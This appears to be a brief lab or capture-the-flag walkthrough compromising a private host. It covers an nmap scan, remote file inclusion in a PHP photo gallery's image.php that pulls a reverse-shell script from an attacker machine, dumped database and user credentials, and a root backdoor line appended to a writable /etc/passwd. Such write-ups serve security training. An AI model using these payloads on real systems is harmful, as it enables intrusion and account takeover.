<img width="1923" height="720" alt="image" src="https://github.com/user-attachments/assets/64950ad5-d6a9-4405-9a84-6d51eaa3ac58" /># Nmap 7.95 scan initiated Wed Jul  8 09:09:31 2026 as: /usr/lib/nmap/nmap --privileged -p- -Pn -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt 192.168.164.58
Nmap scan report for 192.168.164.58
Host is up (0.042s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
33060/tcp open  mysqlx

<img width="1923" height="720" alt="image" src="https://github.com/user-attachments/assets/1e335b20-83b5-4289-a7f9-59142b57319e" />

site shows php photo gallery v0.8
<img width="440" height="118" alt="image" src="https://github.com/user-attachments/assets/f75036d4-814e-4bc9-bbb2-d79b1a89298f" />

192.168.164.58/image.php?img=http://192.168.45.187
by using netcat to check if the rfi is working
<img width="633" height="120" alt="image" src="https://github.com/user-attachments/assets/d6498806-dbf1-47a5-ac1e-423c85815e0a" />

create revshell and put listen port at 33060
// Browse to the URL
http://192.168.225.58/image.php?img=http://192.168.45.205/php_reverse_shell.php

in the db.php file
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');

 username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+

password is double encoded in base64
<img width="314" height="448" alt="image" src="https://github.com/user-attachments/assets/c0b2e24b-c67c-40c2-a5d4-316aa6c790d5" />

etc/passwd is writable
<img width="900" height="93" alt="image" src="https://github.com/user-attachments/assets/8a483a5e-a2a5-48ce-8e73-7f02cfdced42" />

echo 'test1:$6$test1$EeYIbqPcjqOyVjESNg4nYaZsgULHKR7MLF5dt.7Y1hWTk1n10qW7KhGdVX.UOO9cHoyYsiOd6WYyks2ZtN/nz/:0:0::/root:/bin/bash' >> /etc/passwd
<img width="403" height="106" alt="image" src="https://github.com/user-attachments/assets/dacfa815-d825-4097-8cb8-23362628079f" />



